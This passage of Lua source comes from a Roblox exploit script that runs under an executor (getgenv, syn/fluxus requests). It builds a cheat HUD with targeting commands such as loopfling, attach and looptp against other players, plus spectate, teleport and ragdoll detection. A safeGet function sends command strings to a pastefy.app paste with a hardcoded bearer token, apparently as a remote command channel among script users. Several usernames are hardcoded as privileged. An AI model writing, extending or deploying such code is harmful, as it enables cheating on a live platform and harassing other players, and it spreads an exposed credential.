			frame6.Visible = true
			textButton4.BackgroundColor3 = Color3.fromRGB(35, 35, 48)
			textButton4.TextColor3 = Color3.fromRGB(255, 255, 255)
			textButton4.BackgroundTransparency = 0
			textButton2.BackgroundTransparency = 1
			textButton2.TextColor3 = Color3.fromRGB(150, 150, 170)
			textButton3.BackgroundTransparency = 1
			textButton3.TextColor3 = Color3.fromRGB(150, 150, 170)

			if updateLeaderboardHud then
				updateLeaderboardHud(true)
			elseif getgenv().updateLeaderboardHud then
				getgenv().updateLeaderboardHud(true)
			end
		end
	end

	textButton2.MouseButton1Click:Connect(function()
		fn("target")
	end)

	textButton3.MouseButton1Click:Connect(function()
		fn("cmds")
	end)

	textButton4.MouseButton1Click:Connect(function()
		fn("leaderboard")
	end)

	local flag = true
	local n = 50

	local function fn2(arg)
		local currentCamera = workspace.CurrentCamera
		n = math.clamp(arg, 10, currentCamera and math.max(100, currentCamera.ViewportSize.Y - 100) or 700)
		textButton.Position = UDim2.new(1, -34, 0, n)
		frame.Position = UDim2.new(1, -360, 0, n)
	end

	local function fn3(visible)
		flag = visible
		frame.Visible = visible
		textButton.Text = flag and ">" or "<"
	end

	local flag2 = false
	local y = nil
	local v = nil
	local flag3 = false

	textButton.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			flag2 = true
			flag3 = false
			y = input.Position.Y
			v = n

			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					if flag2 then
						flag2 = false

						if not flag3 then
							fn3(not flag)
						end
					end
				end
			end)
		end
	end)

	textButton.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if flag2 and y and v then
				local n2 = input.Position.Y - y

				if math.abs(n2) > 3 then
					flag3 = true
				end

				fn2(v + n2)
			end
		end
	end)

	UserInputService_.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if flag2 and y and v then
				local n2 = input.Position.Y - y

				if math.abs(n2) > 3 then
					flag3 = true
				end

				fn2(v + n2)
			end
		end
	end)

	getgenv().setVapeHudEnabled = function(enabled)
		if enabled == nil then
			enabled = not screenGui.Enabled
		end

		screenGui.Enabled = enabled
		getgenv().VapeHudEnabled = enabled

		if getgenv().updateVapeHudSettingsUI then
			getgenv().updateVapeHudSettingsUI(enabled)
		end

		if updatesaves then
			pcall(updatesaves)
		end
	end

	UserInputService_.InputBegan:Connect(function(input, gameProcessed)
		local flag4 = not gameProcessed
		local flag5

		if flag4 then
			flag5 = input.KeyCode == (getgenv().VapeHudKey or Enum.KeyCode.RightShift)
		else
			flag5 = flag4
		end

		if flag5 then
			getgenv().setVapeHudEnabled()
		end
	end)

	local function fn4()
		local tbl3 = {}

		for k in pairs(tbl) do
			table.insert(tbl3, k)
		end

		table.sort(tbl3, function(arg, arg2)
			return #arg > #arg2
		end)

		for i, v2 in ipairs(tbl3) do
			local v3 = tbl2[v2]

			if v3 then
				v3.LayoutOrder = i
			end
		end

		scrollingFrame2.CanvasSize = UDim2.new(0, 0, 0, #tbl3 * 27)
	end

	local function fn5(name)
		if tbl[name] then
			return
		end
		tbl[name] = true
		local frame7 = Instance.new("Frame")
		frame7.Name = name
		frame7.BackgroundTransparency = 1
		frame7.BorderSizePixel = 0
		frame7.Size = UDim2.new(1, 0, 0, 0)
		frame7.Parent = scrollingFrame2
		local textLabel5 = Instance.new("TextLabel")
		textLabel5.Name = "Text"
		textLabel5.BackgroundTransparency = 1
		textLabel5.Font = Enum.Font.GothamSemibold
		textLabel5.TextSize = 14
		textLabel5.Text = name
		textLabel5.TextColor3 = Color3.fromRGB(240, 240, 255)
		textLabel5.TextXAlignment = Enum.TextXAlignment.Right
		textLabel5.Size = UDim2.new(1, -12, 1, 0)
		textLabel5.TextTransparency = 1
		textLabel5.Parent = frame7
		local frame8 = Instance.new("Frame")
		frame8.Name = "Bar"
		frame8.Size = UDim2.new(0, 3, 1, 0)
		frame8.Position = UDim2.new(1, -3, 0, 0)
		frame8.BorderSizePixel = 0
		frame8.BackgroundColor3 = Color3.fromRGB(245, 66, 120)
		frame8.BackgroundTransparency = 1
		frame8.Parent = frame7
		tbl2[name] = frame7
		TweenService_:Create(frame7, TweenInfo.new(0.2), { Size = UDim2.new(1, 0, 0, 24) }):Play()
		TweenService_:Create(textLabel5, TweenInfo.new(0.2), { TextTransparency = 0 }):Play()
		TweenService_:Create(frame8, TweenInfo.new(0.2), { BackgroundTransparency = 0 }):Play()
		fn4()
	end

	local function fn6(arg)
		if not tbl[arg] then
			return
		end
		tbl[arg] = nil
		local v2 = tbl2[arg]

		if v2 then
			tbl2[arg] = nil
			local text = v2:FindFirstChild("Text")
			local bar = v2:FindFirstChild("Bar")
			local tween = TweenService_:Create(v2, TweenInfo.new(0.2), { Size = UDim2.new(1, 0, 0, 0) })

			if text then
				TweenService_:Create(text, TweenInfo.new(0.2), { TextTransparency = 1 }):Play()
			end

			if bar then
				TweenService_:Create(bar, TweenInfo.new(0.2), { BackgroundTransparency = 1 }):Play()
			end

			tween:Play()

			tween.Completed:Connect(function()
				v2:Destroy()
			end)
		end

		fn4()
	end

	task.spawn(function()
		while true do
			task.wait()
			local color = Color3.fromHSV(tick() % 5 / 5, 0.8, 1)

			for _, v2 in pairs(tbl2) do
				local bar = v2:FindFirstChild("Bar")

				if bar then
					bar.BackgroundColor3 = color
				end
			end
		end
	end)

	getgenv().addvape = function(arg)
		local str = ({
			infjump = "Infinite Jump",
			infinitejump = "Infinite Jump",
			ws = "Speed",
			speed = "Speed",
			walkspeed = "Speed",
			jp = "Jump Power",
			jumppower = "Jump Power",
			gasp = "Gasp",
			gp = "Gasp",
			noanim = "No Anim",
			noanime = "No Anim",
			bypassantiskill = "No Anim",
			unnoanim = "No Anim",
			unnoanime = "No Anim",
			unbypassantiskill = "No Anim",
			unbypassantiskills = "No Anim",
		})[arg:lower()]

		if not str then
			local str2 = arg:gsub("(%a)(%w*)", function(arg2, arg3)
				return arg2:upper() .. arg3:lower()
			end)

			if str2:sub(1, 4) == "Loop" and str2:sub(5, 5) ~= " " then
				str = "Loop " .. str2:sub(5)
			else
				str = str2
			end

			if str:sub(1, 4) == "Anti" and str:sub(5, 5) ~= " " then
				str = "Anti " .. str:sub(5)
			end
		end

		fn5(str)
	end

	getgenv().delvape = function(arg)
		local str = ({
			infjump = "Infinite Jump",
			infinitejump = "Infinite Jump",
			ws = "Speed",
			speed = "Speed",
			walkspeed = "Speed",
			jp = "Jump Power",
			jumppower = "Jump Power",
			gasp = "Gasp",
			gp = "Gasp",
			noanim = "No Anim",
			noanime = "No Anim",
			bypassantiskill = "No Anim",
			unnoanim = "No Anim",
			unnoanime = "No Anim",
			unbypassantiskill = "No Anim",
			unbypassantiskills = "No Anim",
		})[arg:lower()]

		if not str then
			str = arg:gsub("(%a)(%w*)", function(arg2, arg3)
				return arg2:upper() .. arg3:lower()
			end)

			if str:sub(1, 4) == "Loop" and str:sub(5, 5) ~= " " then
				str = "Loop " .. str:sub(5)
			end

			if str:sub(1, 4) == "Anti" and str:sub(5, 5) ~= " " then
				str = "Anti " .. str:sub(5)
			end
		end

		fn6(str)
	end

	local tbl3 = {}

	local function fn7(arg)
		if tbl3[arg] then
			return tbl3[arg]
		end
		local frame7 = Instance.new("Frame")
		frame7.Name = "Card_" .. arg.Name
		frame7.Size = UDim2.new(0, 190, 0, 245)
		frame7.BackgroundColor3 = Color3.fromRGB(20, 20, 27)
		frame7.BorderSizePixel = 0
		frame7.Parent = scrollingFrame
		local uiCorner7 = Instance.new("UICorner")
		uiCorner7.CornerRadius = UDim.new(0, 10)
		uiCorner7.Parent = frame7
		local uiStroke3 = Instance.new("UIStroke")
		uiStroke3.Color = Color3.fromRGB(50, 50, 65)
		uiStroke3.Thickness = 1.2
		uiStroke3.Parent = frame7
		local frame8 = Instance.new("Frame")
		frame8.Name = "TagsFrame"
		frame8.Size = UDim2.new(1, -12, 0, 20)
		frame8.Position = UDim2.new(0, 6, 0, 6)
		frame8.BackgroundTransparency = 1
		frame8.Parent = frame7
		local textLabel5 = Instance.new("TextLabel")
		textLabel5.Name = "StatusBadge"
		textLabel5.Size = UDim2.new(0, 48, 1, 0)
		textLabel5.BackgroundColor3 = Color3.fromRGB(18, 42, 28)
		textLabel5.Font = Enum.Font.GothamBold
		textLabel5.TextSize = 10
		textLabel5.Text = "Alive"
		textLabel5.TextColor3 = Color3.fromRGB(75, 230, 140)
		textLabel5.Parent = frame8
		local uiCorner8 = Instance.new("UICorner")
		uiCorner8.CornerRadius = UDim.new(0, 6)
		uiCorner8.Parent = textLabel5
		local uiStroke4 = Instance.new("UIStroke")
		uiStroke4.Color = Color3.fromRGB(35, 90, 55)
		uiStroke4.Thickness = 1
		uiStroke4.Parent = textLabel5
		local textLabel6 = Instance.new("TextLabel")
		textLabel6.Name = "TagBadge"
		textLabel6.Size = UDim2.new(0, 56, 1, 0)
		textLabel6.Position = UDim2.new(0, 52, 0, 0)
		textLabel6.BackgroundColor3 = Color3.fromRGB(28, 28, 38)
		textLabel6.Font = Enum.Font.GothamMedium
		textLabel6.TextSize = 10
		textLabel6.Text = "In Game"
		textLabel6.TextColor3 = Color3.fromRGB(180, 180, 200)
		textLabel6.Parent = frame8
		local uiCorner9 = Instance.new("UICorner")
		uiCorner9.CornerRadius = UDim.new(0, 6)
		uiCorner9.Parent = textLabel6
		local imageLabel = Instance.new("ImageLabel")
		imageLabel.Name = "AvatarImg"
		imageLabel.Size = UDim2.new(0, 80, 0, 80)
		imageLabel.Position = UDim2.new(0.5, -40, 0, 30)
		imageLabel.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
		imageLabel.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
		imageLabel.Parent = frame7
		local uiCorner10 = Instance.new("UICorner")
		uiCorner10.CornerRadius = UDim.new(0, 8)
		uiCorner10.Parent = imageLabel

		task.spawn(function()
			local userThumbnailAsync, userThumbnailAsync2 = Players:GetUserThumbnailAsync(arg.UserId, Enum.ThumbnailType.AvatarBust, Enum.ThumbnailSize.Size150x150)

			if userThumbnailAsync2 and imageLabel and imageLabel.Parent then
				imageLabel.Image = userThumbnailAsync
			end
		end)

		local textLabel7 = Instance.new("TextLabel")
		textLabel7.Name = "NameLabel"
		textLabel7.Size = UDim2.new(1, -12, 0, 16)
		textLabel7.Position = UDim2.new(0, 6, 0, 114)
		textLabel7.BackgroundTransparency = 1
		textLabel7.Font = Enum.Font.GothamBold
		textLabel7.TextSize = 11
		textLabel7.Text = arg.DisplayName .. " (" .. arg.Name .. ")"
		textLabel7.TextColor3 = Color3.fromRGB(240, 240, 250)
		textLabel7.TextTruncate = Enum.TextTruncate.AtEnd
		textLabel7.Parent = frame7
		local frame9 = Instance.new("Frame")
		frame9.Name = "HpBg"
		frame9.Size = UDim2.new(1, -16, 0, 14)
		frame9.Position = UDim2.new(0, 8, 0, 134)
		frame9.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
		frame9.BorderSizePixel = 0
		frame9.Parent = frame7
		local uiCorner11 = Instance.new("UICorner")
		uiCorner11.CornerRadius = UDim.new(0, 4)
		uiCorner11.Parent = frame9
		local frame10 = Instance.new("Frame")
		frame10.Name = "HpFill"
		frame10.Size = UDim2.new(1, 0, 1, 0)
		frame10.BackgroundColor3 = Color3.fromRGB(52, 211, 153)
		frame10.BorderSizePixel = 0
		frame10.Parent = frame9
		local uiCorner12 = Instance.new("UICorner")
		uiCorner12.CornerRadius = UDim.new(0, 4)
		uiCorner12.Parent = frame10
		local textLabel8 = Instance.new("TextLabel")
		textLabel8.Name = "HpText"
		textLabel8.Size = UDim2.new(1, 0, 1, 0)
		textLabel8.BackgroundTransparency = 1
		textLabel8.Font = Enum.Font.GothamBold
		textLabel8.TextSize = 9
		textLabel8.Text = "100 / 100 HP"
		textLabel8.TextColor3 = Color3.fromRGB(255, 255, 255)
		textLabel8.Parent = frame9
		local frame11 = Instance.new("Frame")
		frame11.Name = "CmdsFrame"
		frame11.Size = UDim2.new(1, -12, 0, 84)
		frame11.Position = UDim2.new(0, 6, 0, 154)
		frame11.BackgroundTransparency = 1
		frame11.Parent = frame7
		local uiListLayout4 = Instance.new("UIListLayout")
		uiListLayout4.Parent = frame11
		uiListLayout4.FillDirection = Enum.FillDirection.Vertical
		uiListLayout4.SortOrder = Enum.SortOrder.LayoutOrder
		uiListLayout4.Padding = UDim.new(0, 4)
		tbl3[arg] = { Card = frame7, StatusBadge = textLabel5, StatusStroke = uiStroke4, HpFill = frame10, HpText = textLabel8, CmdsFrame = frame11 }
		return tbl3[arg]
	end

	local function fn8()
		local n2 = 0

		for k, targetCmd in pairs(getgenv().TargetCmds) do
			local flag4 = false

			for _, v2 in pairs(targetCmd) do
				if v2 then
					flag4 = true
					break
				end
			end

			if flag4 and k.Parent == Players then
				n2 += 1
				local v2 = fn7(k)
				v2.Card.Visible = true

				for _, child in pairs(v2.CmdsFrame:GetChildren()) do
					if child:IsA("TextButton") then
						child:Destroy()
					end
				end

				for k2, v3 in pairs(targetCmd) do
					if v3 then
						local str = "un" .. k2
						local textButton5 = Instance.new("TextButton")
						textButton5.Name = "UnBtn_" .. k2
						textButton5.Size = UDim2.new(1, 0, 0, 24)
						textButton5.BackgroundColor3 = Color3.fromRGB(42, 24, 34)
						textButton5.Font = Enum.Font.GothamBold
						textButton5.TextSize = 11
						textButton5.Text = "❌ " .. str
						textButton5.TextColor3 = Color3.fromRGB(245, 100, 120)
						textButton5.Parent = v2.CmdsFrame
						local uiCorner7 = Instance.new("UICorner")
						uiCorner7.CornerRadius = UDim.new(0, 6)
						uiCorner7.Parent = textButton5
						local uiStroke3 = Instance.new("UIStroke")
						uiStroke3.Color = Color3.fromRGB(85, 35, 55)
						uiStroke3.Thickness = 1
						uiStroke3.Parent = textButton5

						textButton5.MouseButton1Click:Connect(function()
							if getgenv().removeTargetCmd then
								getgenv().removeTargetCmd(k, k2)
							end

							if execCmd then
								if k2 == "loopfling" then
									execCmd("unloopfling")
								elseif k2 == "attach" or k2 == "at" or k2 == "looptp" then
									execCmd("unattach")
								else
									execCmd(str .. " " .. k.Name)
								end
							end
						end)
					end
				end
			elseif tbl3[k] then
				tbl3[k].Card:Destroy()
				tbl3[k] = nil
			end
		end

		for k, v2 in pairs(tbl3) do
			if k.Parent ~= Players or not getgenv().TargetCmds[k] then
				v2.Card:Destroy()
				tbl3[k] = nil
			end
		end

		textLabel2.Visible = n2 == 0
		scrollingFrame.CanvasSize = UDim2.new(0, math.max(1, n2) * 200 + 10, 0, 0)
	end

	getgenv().addTargetCmd = function(arg, arg2)
		if typeof(arg) ~= "Instance" or not arg:IsA("Player") then
			local v2 = nil

			if type(arg) == "string" then
				local v3 = nil
				local exitTo = nil

				for _, player in pairs(Players:GetPlayers()) do
					if player.Name:lower() == arg:lower() or player.DisplayName:lower() == arg:lower() then
						exitTo = 1
						break
					else
						v3 = nil
					end
				end

				if exitTo == 1 then
					arg = s4
				else
					arg = v3
				end
			else
				arg = v2
			end
		end

		if arg then
			if not getgenv().TargetCmds[arg] then
				getgenv().TargetCmds[arg] = {}
			end

			getgenv().TargetCmds[arg][arg2:lower()] = true
			fn8()
		end
	end

	getgenv().removeTargetCmd = function(arg, arg2)
		if not arg then
			for k, targetCmd in pairs(getgenv().TargetCmds) do
				if targetCmd[arg2:lower()] then
					targetCmd[arg2:lower()] = nil

					if next(targetCmd) == nil then
						getgenv().TargetCmds[k] = nil
					end
				end
			end
		else
			if typeof(arg) ~= "Instance" or not arg:IsA("Player") then
				local v2 = nil

				if type(arg) == "string" then
					local v3 = nil
					local exitTo = nil

					for _, player in pairs(Players:GetPlayers()) do
						if player.Name:lower() == arg:lower() or player.DisplayName:lower() == arg:lower() then
							exitTo = 1
							break
						else
							v3 = nil
						end
					end

					if exitTo == 1 then
						arg = s6
					else
						arg = v3
					end
				else
					arg = v2
				end
			end

			if arg and getgenv().TargetCmds[arg] then
				getgenv().TargetCmds[arg][arg2:lower()] = nil

				if next(getgenv().TargetCmds[arg]) == nil then
					getgenv().TargetCmds[arg] = nil
				end
			end
		end

		fn8()
	end

	getgenv().clearTargetCmds = function(arg)
		if not arg then
			getgenv().TargetCmds = {}
		else
			getgenv().removeTargetCmd(arg, "")
		end

		fn8()
	end

	task.spawn(function()
		while true do
			task.wait(0.2)

			for k, v2 in pairs(tbl3) do
				if k and k.Parent == Players and v2.Card and v2.Card.Parent then
					local character = k.Character
					character = character and character:FindFirstChildOfClass("Humanoid")

					if character and character.Health > 0 then
						v2.StatusBadge.Text = "Alive"
						v2.StatusBadge.TextColor3 = Color3.fromRGB(75, 230, 140)
						v2.StatusBadge.BackgroundColor3 = Color3.fromRGB(18, 42, 28)
						v2.StatusStroke.Color = Color3.fromRGB(35, 90, 55)
						local n2 = math.floor(character.Health)
						local n3 = math.floor(math.max(1, character.MaxHealth))
						local n4 = math.clamp(n2 / n3, 0, 1)
						v2.HpText.Text = n2 .. " / " .. n3 .. " HP"
						v2.HpFill.Size = UDim2.new(n4, 0, 1, 0)
						if n4 > 0.5 then
							v2.HpFill.BackgroundColor3 = Color3.fromRGB(52, 211, 153)
							continue
						end

						if n4 > 0.25 then
							v2.HpFill.BackgroundColor3 = Color3.fromRGB(245, 158, 11)
							continue
						end
						v2.HpFill.BackgroundColor3 = Color3.fromRGB(239, 68, 68)
						continue
					end

					v2.StatusBadge.Text = "Dead"
					v2.StatusBadge.TextColor3 = Color3.fromRGB(240, 90, 90)
					v2.StatusBadge.BackgroundColor3 = Color3.fromRGB(45, 20, 20)
					v2.StatusStroke.Color = Color3.fromRGB(90, 35, 35)
					v2.HpText.Text = "0 / 100 HP"
					v2.HpFill.Size = UDim2.new(0, 0, 1, 0)
				end
			end
		end
	end)

	local tbl4 = { cards = {}, activeProfileGui = nil }
	local v2 = nil
	local connection = nil
	local connection2 = nil
	local connection3 = nil
	local connection4 = nil

	local function fn9()
		if connection then
			connection:Disconnect()
			connection = nil
		end

		if connection2 then
			connection2:Disconnect()
			connection2 = nil
		end

		if connection3 then
			connection3:Disconnect()
			connection3 = nil
		end

		if connection4 then
			connection4:Disconnect()
			connection4 = nil
		end
	end

	local function getHwid2()
		local currentCamera = workspace.CurrentCamera
		local localPlayer = Players.LocalPlayer
		if not currentCamera then
			return
		end

		pcall(function()
			currentCamera.CameraType = Enum.CameraType.Custom

			if localPlayer and localPlayer.Character then
				local humanoid = localPlayer.Character:FindFirstChildOfClass("Humanoid")
				local humanoidRootPart = localPlayer.Character:FindFirstChild("HumanoidRootPart") or localPlayer.Character:FindFirstChild("Head")
				currentCamera.CameraSubject = humanoid or humanoidRootPart
			end
		end)
	end

	local function getGlobal(key)
		if not key or key.Parent ~= Players then
			return nil
		end
		local character = key.Character
		if not character then
			return nil
		end
		local humanoid = character:FindFirstChildOfClass("Humanoid")
		if humanoid and humanoid.Health > 0 then
			return humanoid
		end
		return character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("Head") or character:FindFirstChild("UpperTorso") or character:FindFirstChild("Torso")
	end

	local function fn10(arg)
		local localPlayer = Players.LocalPlayer
		local currentCamera = workspace.CurrentCamera

		if not arg or arg == localPlayer or v2 == arg then
			v2 = nil
			fn9()
			getHwid2()

			if notify then
				notify("시점 보기", "내 캐릭터 시점으로 돌아왔습니다.", 2)
			end

			if updateLeaderboardHud then
				pcall(updateLeaderboardHud)
			end

			return
		end

		v2 = arg
		fn9()

		local function fn11()
			if not v2 or v2.Parent ~= Players then
				v2 = nil
				fn9()
				getHwid2()

				if notify then
					notify("시점 보기", "대상 플레이어가 퇴장하여 내 시점으로 복귀했습니다.", 2)
				end

				if updateLeaderboardHud then
					pcall(updateLeaderboardHud)
				end

				return
			end

			local currentCamera2 = workspace.CurrentCamera
			if not currentCamera2 then
				return
			end
			local v3 = getGlobal(v2)

			if v3 then
				if currentCamera2.CameraType ~= Enum.CameraType.Custom then
					currentCamera2.CameraType = Enum.CameraType.Custom
				end

				if currentCamera2.CameraSubject ~= v3 then
					currentCamera2.CameraSubject = v3
				end
			end
		end

		fn11()

		if currentCamera then
			connection2 = currentCamera:GetPropertyChangedSignal("CameraSubject"):Connect(function()
				if v2 then
					local v3 = getGlobal(v2)

					if v3 and currentCamera.CameraSubject ~= v3 then
						currentCamera.CameraSubject = v3
					end
				end
			end)
		end

		connection = RunService_.RenderStepped:Connect(function()
			fn11()
		end)

		connection3 = arg.CharacterAdded:Connect(function(character)
			task.spawn(function()
				local humanoid = character:WaitForChild("Humanoid", 5)
				local humanoidRootPart = character:WaitForChild("HumanoidRootPart", 5)
				humanoid = humanoid or humanoidRootPart
				local currentCamera2 = workspace.CurrentCamera

				if v2 == arg and humanoid and currentCamera2 then
					currentCamera2.CameraType = Enum.CameraType.Custom
					currentCamera2.CameraSubject = humanoid
				end
			end)
		end)

		connection4 = Players.PlayerRemoving:Connect(function(player)
			if player == v2 then
				v2 = nil
				fn9()
				getHwid2()

				if notify then
					notify("시점 보기", player.DisplayName .. " 님이 퇴장하여 관전이 종료되었습니다.", 2)
				end

				if updateLeaderboardHud then
					pcall(updateLeaderboardHud)
				end
			end
		end)

		if notify then
			notify("시점 보기", arg.DisplayName .. " (@" .. arg.Name .. ") 님의 시점을 봅니다.", 2)
		end

		if updateLeaderboardHud then
			pcall(updateLeaderboardHud)
		end
	end

	local function fn11(arg)
		if not arg or arg == Players.LocalPlayer then
			return
		end
		local localPlayer = Players.LocalPlayer
		localPlayer = localPlayer and localPlayer.Character

		if localPlayer then
			localPlayer = localPlayer:FindFirstChild("HumanoidRootPart") or localPlayer:FindFirstChild("Torso")
		end

		local character = arg.Character

		if character then
			character = character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("Torso")
		end

		if localPlayer and character then
			localPlayer.CFrame = character.CFrame * CFrame.new(0, 0, 3)

			if notify then
				notify("텔레포트", arg.DisplayName .. " 님에게 이동했습니다.", 2)
			end
		elseif notify then
			notify("Error", "캐릭터를 찾을 수 없습니다.", 2)
		end
	end

	local function fn12(arg)
		if not arg then
			return false
		end
		local v3 = string.lower(arg.Name)
		if v3 == "kr1top_unknown" or v3 == "failtraillode" or v3 == "luna_lovedl" then
			return true
		end
		local activeScriptUsersMap = getgenv().activeScriptUsersMap
		if activeScriptUsersMap and activeScriptUsersMap[v3] then
			return true
		end
		return false
	end

	local function fn13(arg)
		if not arg then
			return false
		end
		local character = arg.Character
		if not character then
			return false
		end
		local ragdoll = character:FindFirstChild("Ragdoll")
		if ragdoll and ragdoll:IsA("Accessory") then
			return true
		end
		local flag4 = false

		pcall(function()
			if getnilinstances then
				local _next = next
				local v3, v4 = getnilinstances()

				for _, v5 in _next, v3, v4 do
					if v5.ClassName == "Accessory" and v5.Name == "Ragdoll" then
						local handle = v5:FindFirstChild("Handle")

						if handle then
							for _, v6 in ipairs(handle:GetJoints()) do
								if v6.Part0 and v6.Part0:IsDescendantOf(character) or v6.Part1 and v6.Part1:IsDescendantOf(character) then
									flag4 = true
									break
								end
							end

							if not flag4 then
								for _, child in ipairs(handle:GetChildren()) do
									if child:IsA("Weld") or child:IsA("Motor6D") or child:IsA("WeldConstraint") then
										local part0 = child.Part0 and child.Part0:IsDescendantOf(character)
										local part1

										if part0 then
											part1 = part0
										else
											part1 = child.Part1 and child.Part1:IsDescendantOf(character)
										end

										if part1 then
											flag4 = true
											break
										end
									end
								end
							end
						end

						if not flag4 then
							continue
						end
					else
						continue
					end

					break
				end
			end
		end)

		if flag4 then
			return true
		end

		if character:GetAttribute("Ragdoll") == true or character:GetAttribute("Ragdolled") == true then
			return true
		end

		if character:FindFirstChild("Ragdolled") or character:FindFirstChild("RagdollSim") then
			return true
		end
		local humanoid = character:FindFirstChildOfClass("Humanoid")

		if humanoid then
			if humanoid.PlatformStand then
				return true
			end
			local state = humanoid:GetState()
			if state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown then
				return true
			end
			local animator = humanoid:FindFirstChildOfClass("Animator")

			if animator then
				for _, v3 in ipairs(animator:GetPlayingAnimationTracks()) do
					local str = v3.Animation and v3.Animation.Name:lower() or ""
					local str2 = v3.Name:lower()
					if (str:find("ragdoll") or str2:find("ragdoll")) and v3.IsPlaying and v3.WeightCurrent > 0.1 then
						return true
					end
				end
			end
		end

		return false
	end

	local function fn14(arg)
		local n2 = 0
		local n3 = 0

		pcall(function()
			local leaderstats = arg:FindFirstChild("leaderstats")

			if leaderstats then
				local kills = leaderstats:FindFirstChild("Kills") or leaderstats:FindFirstChild("Kill")

				if kills and kills:IsA("ValueBase") then
					n2 = kills.Value
				end

				local totalKills = leaderstats:FindFirstChild("Total Kills") or leaderstats:FindFirstChild("TotalKills") or leaderstats:FindFirstChild("Total_Kills")

				if totalKills and totalKills:IsA("ValueBase") then
					n3 = totalKills.Value
				end
			end
		end)

		return n2, n3
	end

	local function safeGet(tbl5, key)
		local sendRemoteCommand = getgenv().sendRemoteCommand

		if not sendRemoteCommand then
			local _httprequest = httprequest
			local request_

			if _httprequest then
				request_ = _httprequest
			else
				request_ = syn and syn.request
			end

			local request_2 = request_ or http and http.request or http_request or fluxus and fluxus.request or request

			if request_2 then
				local str = "VNW4VFUeWAgZNLCphil4pc6uAKVcmZmtOi6yziEPuR5FmEjJwndwIcezg0kZ"
				local str2 = tbl5 .. "|" .. key

				return (pcall(function()
					request_2({
						Url = "https://pastefy.app/api/v2/paste/TlJLq0iV",
						Method = "PUT",
						Headers = {
							Authorization = "Bearer " .. str,
							["Content-Type"] = "application/json",
							["Cache-Control"] = "no-cache, no-store, must-revalidate",
							Pragma = "no-cache",
						},
						Body = game:GetService("HttpService"):JSONEncode({ title = "cmd", content = str2 }),
					})
				end))
			end

			return false
		end

		return sendRemoteCommand(tbl5, key)
	end

	local function fn15(arg)
		if not arg or arg.Parent ~= Players then
			return
		end

		if tbl4.activeProfileGui and tbl4.activeProfileGui.Parent then
			tbl4.activeProfileGui:Destroy()
			tbl4.activeProfileGui = nil
		end

		local screenGui2 = Instance.new("ScreenGui")
		screenGui2.Name = "UnknownPlayerProfileModal"
		screenGui2.ResetOnSpawn = false
		screenGui2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		screenGui2.DisplayOrder = 10001
		screenGui2.Parent = _COREGUI
		tbl4.activeProfileGui = screenGui2
		local v3 = fn12(arg)
		local userRank = getgenv().userRank or 1
		local flag4 = v3 and userRank >= 2 and arg ~= Players.LocalPlayer
		local frame7 = Instance.new("Frame")
		frame7.Name = "ModalFrame"
		frame7.Size = flag4 and UDim2.new(0, 310, 0, 240) or UDim2.new(0, 310, 0, 195)
		frame7.Position = UDim2.new(0.5, -155, 0.5, -120)
		frame7.BackgroundColor3 = Color3.fromRGB(18, 18, 25)
		frame7.BorderSizePixel = 0
		frame7.ClipsDescendants = true
		frame7.Parent = screenGui2
		local uiCorner7 = Instance.new("UICorner")
		uiCorner7.CornerRadius = UDim.new(0, 10)
		uiCorner7.Parent = frame7
		local uiStroke3 = Instance.new("UIStroke")
		uiStroke3.Color = Color3.fromRGB(55, 55, 75)
		uiStroke3.Thickness = 1.4
		uiStroke3.Parent = frame7
		local frame8 = Instance.new("Frame")
		frame8.Name = "TitleBar"
		frame8.Size = UDim2.new(1, 0, 0, 36)
		frame8.BackgroundColor3 = Color3.fromRGB(26, 26, 36)
		frame8.BorderSizePixel = 0
		frame8.Parent = frame7
		local uiCorner8 = Instance.new("UICorner")
		uiCorner8.CornerRadius = UDim.new(0, 10)
		uiCorner8.Parent = frame8
		local textLabel5 = Instance.new("TextLabel")
		textLabel5.Size = UDim2.new(1, -45, 1, 0)
		textLabel5.Position = UDim2.new(0, 12, 0, 0)
		textLabel5.BackgroundTransparency = 1
		textLabel5.Font = Enum.Font.GothamBold
		textLabel5.TextSize = 13
		textLabel5.Text = "👤 Player Profile"
		textLabel5.TextColor3 = Color3.fromRGB(240, 240, 255)
		textLabel5.TextXAlignment = Enum.TextXAlignment.Left
		textLabel5.Parent = frame8
		local textButton5 = Instance.new("TextButton")
		textButton5.Name = "CloseBtn"
		textButton5.Size = UDim2.new(0, 24, 0, 24)
		textButton5.Position = UDim2.new(1, -30, 0, 6)
		textButton5.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
		textButton5.BorderSizePixel = 0
		textButton5.Font = Enum.Font.GothamBold
		textButton5.TextSize = 13
		textButton5.Text = "X"
		textButton5.TextColor3 = Color3.fromRGB(255, 255, 255)
		textButton5.Parent = frame8
		local uiCorner9 = Instance.new("UICorner")
		uiCorner9.CornerRadius = UDim.new(0, 6)
		uiCorner9.Parent = textButton5

		textButton5.MouseButton1Click:Connect(function()
			screenGui2:Destroy()
			tbl4.activeProfileGui = nil
		end)

		local flag5 = false
		local position = nil
		local position2 = nil

		frame8.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				flag5 = true
				position = input.Position
				position2 = frame7.Position

				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						flag5 = false
					end
				end)
			end
		end)

		UserInputService_.InputChanged:Connect(function(input)
			if flag5 and position and position2 and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
				local n2 = input.Position - position
				frame7.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n2.X, position2.Y.Scale, position2.Y.Offset + n2.Y)
			end
		end)

		local frame9 = Instance.new("Frame")
		frame9.Size = UDim2.new(1, -20, 1, -44)
		frame9.Position = UDim2.new(0, 10, 0, 40)
